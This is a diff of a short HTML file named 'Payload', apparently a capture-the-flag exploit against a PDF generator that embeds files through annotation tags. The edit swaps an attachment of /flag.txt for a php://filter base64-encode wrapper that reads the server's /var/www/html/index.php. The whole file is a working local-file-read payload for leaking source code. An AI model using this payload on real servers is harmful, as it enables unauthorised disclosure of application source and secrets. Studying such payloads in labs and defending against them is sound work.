@@ -2,10 +2,12 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Payload</title>
+    <title>Payload - Read Source Code</title>
 </head>
 <body>
-    <h1>Trying to fetch /flag.txt</h1>
-    <annotation file="/flag.txt" content="Get Flag" icon="Graph" title="Flag_Attachment"></annotation>
+    <h1>Trying to fetch Source Code</h1>
+    
+    <annotation file="php://filter/read=convert.base64-encode/resource=/var/www/html/index.php" content="Source1" icon="Graph" title="Index_PHP"></annotation>
+    
 </body>
 </html>
